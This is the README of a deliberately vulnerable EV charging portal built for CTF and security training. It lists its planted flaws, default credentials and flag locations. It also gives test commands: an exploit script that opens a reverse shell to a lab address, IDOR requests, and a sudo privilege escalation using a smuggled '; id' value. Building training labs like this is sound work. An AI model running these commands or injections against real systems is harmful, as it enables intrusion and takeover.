# EcoCharge Portal - CTF Vulnerable Web Application

## Overview

This is a deliberately vulnerable web application simulating a regional EV charging network operator's portal. It is designed for cybersecurity training and CTF (Capture The Flag) competitions.

**⚠️ WARNING: This application contains intentional security vulnerabilities. DO NOT deploy in production environments!**

## Quick Start

```bash
# Clone repository
git clone https://github.com/lota-ll/ecocharge-website.git
cd ecocharge-website

# Install dependencies
npm install --legacy-peer-deps

# Build
npm run build

# Start
npm start
```

Application will be available at `http://localhost:3000`

## Deployment on Server

```bash
# Run automated setup (requires root)
chmod +x setup-server.sh
sudo ./setup-server.sh
```

The setup script will:
- Install Node.js and dependencies
- Configure nginx as reverse proxy
- Create systemd service
- Set up CTF flags
- Configure privilege escalation vulnerability

## Vulnerabilities Included

| Vulnerability | Location | Severity | CVSS |
|--------------|----------|----------|------|
| React Server Components RCE | `/api/server-action` | Critical | 9.8 |
| Command Injection (PrivEsc) | `/opt/maintenance/backup.js` | High | 7.8 |
| IDOR | `/api/user?user_id=X` | Medium | 6.5 |
| Weak Authentication (MD5) | `/api/auth` | Medium | 5.3 |
| Information Disclosure | HTTP headers, errors | Low | 3.7 |

## Default Credentials

| Role | Email | Password |
|------|-------|----------|
| Admin | admin@ecocharge.local | EcoCharge2024! |
| Operator | operator@ecocharge.local | Operator123! |
| User | user@ecocharge.local | 12345678 |

## Project Structure

```
ecocharge-website/
├── app/
│   ├── api/
│   │   ├── auth/           # Authentication endpoints
│   │   ├── server-action/  # Vulnerable RCE endpoint
│   │   ├── stations/       # Stations API
│   │   └── user/           # User API (IDOR)
│   ├── admin/              # Admin panel
│   │   ├── layout.js       # Admin layout
│   │   ├── page.js         # Dashboard
│   │   ├── stations/       # Stations management
│   │   ├── users/          # Users management
│   │   ├── transactions/   # Transactions history
│   │   └── settings/       # System settings
│   ├── auth/               # Login/Register pages
│   ├── dashboard/          # User dashboard
│   ├── stations/           # Public stations list
│   ├── about/              # About page
│   ├── prices/             # Pricing page
│   ├── layout.js           # Main layout
│   ├── page.js             # Homepage
│   └── globals.css         # Styles
├── scripts/
│   └── backup.js           # Vulnerable backup script
├── .env                    # Configuration (contains secrets)
├── exploit.py              # CVE-2025-55182 exploit PoC
├── setup-server.sh         # Deployment script
├── package.json
├── next.config.js
└── README.md
```

## CTF Flags

| # | Location | Description |
|---|----------|-------------|
| 1 | `/var/www/ecocharge/.flag1.txt` | Initial access (www-data) |
| 2 | `/root/.flag2.txt` | Privilege escalation (root) |
| 3 | `.env` file | Credential leak |

## API Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/stations` | GET | List all charging stations |
| `/api/stations` | POST | Get station by ID |
| `/api/auth` | POST | User authentication |
| `/api/auth` | GET | Verify token |
| `/api/auth/register` | POST | User registration |
| `/api/user` | GET | Get user data (IDOR vulnerable) |
| `/api/server-action` | POST | **VULNERABLE** - RCE endpoint |

## Network Configuration

| Parameter | Value |
|-----------|-------|
| IP Address | 192.168.125.50 |
| Hostname | ecocharge-web |
| Network | External (192.168.125.0/24) |

## Testing Vulnerabilities

### Test RCE (CVE-2025-55182)

```bash
python3 exploit.py https://ecocharge.local check
python3 exploit.py https://ecocharge.local exec 'id'
python3 exploit.py https://ecocharge.local revshell 192.168.125.228 4444
```

### Test IDOR

```bash
curl https://ecocharge.local/api/user?user_id=1 -k
curl https://ecocharge.local/api/user?user_id=2 -k
```

### Test Privilege Escalation

```bash
# After getting shell as www-data
sudo -l
export BACKUP_TARGET="; id"
sudo /usr/bin/node /opt/maintenance/backup.js
```

## Technologies

- **Framework**: Next.js 14.2.5
- **Frontend**: React 18.3.1, Tailwind CSS
- **Database**: SQLite (simulated)
- **Web Server**: nginx 1.24

## Security Notice

This application is intentionally vulnerable and should only be used in:
- Isolated lab environments
- CTF competitions
- Security training courses

**Never expose this application to the internet or use in production.**

## License

Educational use only. Created for cybersecurity training purposes.

## Author

Created for Master's Thesis: "Development of a scenario for integrating vulnerability data of EV charging station management system administrative panels into an experimental security analysis environment"
